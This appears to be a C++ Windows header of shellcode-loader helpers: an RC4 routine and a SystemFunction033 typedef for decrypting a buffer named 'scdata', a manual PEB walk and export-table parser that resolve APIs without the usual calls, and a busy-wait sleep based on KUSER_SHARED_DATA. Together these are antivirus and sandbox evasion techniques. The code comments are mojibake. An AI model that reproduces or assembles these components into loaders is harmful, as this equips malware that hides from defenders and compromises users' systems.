#pragma once
#include <iostream>
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(WINAPI* _SystemFunction033)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer);

struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PUCHAR Buffer;
} scdata, key;

struct rc4_state
{
    int x, y, m[256];
};

void rc4_setup(struct rc4_state* s, unsigned char* key, int length)
{
    int i, j, k, * m, a;

    s->x = 0;
    s->y = 0;
    m = s->m;

    for (i = 0; i < 256; i++)
    {
        m[i] = i;
    }

    j = k = 0;

    for (i = 0; i < 256; i++)
    {
        a = m[i];
        j = (unsigned char)(j + a + key[k]);
        m[i] = m[j]; m[j] = a;
        if (++k >= length) k = 0;
    }
}

void rc4_crypt(struct rc4_state* s, unsigned char* data, int length)
{
    int i, x, y, * m, a, b;

    x = s->x;
    y = s->y;
    m = s->m;

    for (i = 0; i < length; i++)
    {
        x = (unsigned char)(x + 1); a = m[x];
        y = (unsigned char)(y + a);
        m[x] = b = m[y];
        m[y] = a;
        data[i] ^= m[(unsigned char)(a + b)];
    }

    s->x = x;
    s->y = y;
}


BOOL StringEq(IN LPCWSTR s1, IN LPCWSTR s2) {

    WCHAR  lStr1[MAX_PATH],
        lStr2[MAX_PATH];

    int    len1 = lstrlenW(s1),
        len2 = lstrlenW(s2);

    int    i = 0,
        j = 0;

    if (len1 >= MAX_PATH || len2 >= MAX_PATH)
        return FALSE;

    for (i = 0; i < len1; i++) {
        lStr1[i] = (WCHAR)tolower(s1[i]);
    }
    lStr1[i++] = L'\0';


    for (j = 0; j < len2; j++) {
        lStr2[j] = (WCHAR)tolower(s2[j]);
    }
    lStr2[j++] = L'\0';


    if (lstrcmpiW(lStr1, lStr2) == 0)
        return TRUE;

    return FALSE;

}
HMODULE MyGetModuleHandle(IN LPCWSTR szModuleName) {
    //��ȡPEB�ṹ

#ifdef _WIN64 
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif

    //��ȡLdr
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

    //��ȡ�����а������ڵ�һ��ģ����Ϣ�ĵ�һ��Ԫ�ء�
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    //����ÿ��pDte�������ж�����һ��Ψһ��DLL�����Կ���ʹ������һ�д��������һ��Ԫ�ء�

    while (pDte) {
        if (pDte->FullDllName.Length != NULL) {
            if (StringEq(pDte->FullDllName.Buffer, szModuleName)) {

#ifdef STRUCTS
                return (HMODULE)(pDte->InMemoryOrderLinks.Flink);
#else
                return (HMODULE)(pDte->Reserved2[0]);
#endif

            }
        }
        else {
            break;
        }
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    return NULL;

}


PVOID MyGetProcAddress(HMODULE handle, LPCSTR Name) {
    PBYTE pBase = (PBYTE)handle;

    //��ȡdosͷ��ַ
    PIMAGE_DOS_HEADER pdosHeader = (PIMAGE_DOS_HEADER)pBase;
    if (pdosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    //��ȡNTͷ��ַ
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pdosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    //��ȡ��ѡPEͷ��ַ
    IMAGE_OPTIONAL_HEADER peOptionHeader = pImageNtHeaders->OptionalHeader;

    //��ȡ��ѡPEͷ��DataDirectory,���а���������Ŀ¼�������ַ���ɻ�ȡ�������������ַ
    PIMAGE_EXPORT_DIRECTORY pExportVirtualAddress = (PIMAGE_EXPORT_DIRECTORY)(pBase + peOptionHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    //��ȡ�������еĺ�������
    PDWORD FunctionNameArray = (PDWORD)(pBase + pExportVirtualAddress->AddressOfNames);
    //��ȡ�������еĺ�����ַ
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pExportVirtualAddress->AddressOfFunctions);
    //��ȡ��ű�
    PWORD ordinArray = (PWORD)(pBase + pExportVirtualAddress->AddressOfNameOrdinals);

    //ѭ������Ѱ��ָ�������ĵ�ַ
    for (DWORD i = 0; i < pExportVirtualAddress->NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID functionAddress = (PVOID)(pBase + FunctionAddressArray[ordinArray[i]]);

        if (strcmp(Name, pFunctionName) == 0) {
            return functionAddress;
        }
    }
}



#define INTERVAL rand() % 26 
#define MS_PER_SECOND 1000 
#define SLEEPTIME INTERVAL*MS_PER_SECOND 

unsigned long long __get_timestamp()
{
    const size_t UNIX_TIME_START = 0x019DB1DED53E8000;
    const size_t TICKS_PER_MILLISECOND = 1000;
    LARGE_INTEGER time;
    time.LowPart = *(DWORD*)(0x7FFE0000 + 0x14);
    time.HighPart = *(long*)(0x7FFE0000 + 0x1c);
    return (unsigned long long)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);
}

void __alt_sleepms(size_t ms)
{
    volatile size_t x = rand();
    const unsigned long long end = __get_timestamp() + ms;
    while (__get_timestamp() < end) { x += 1; }
    if (__get_timestamp() - end > 2000) return;

}
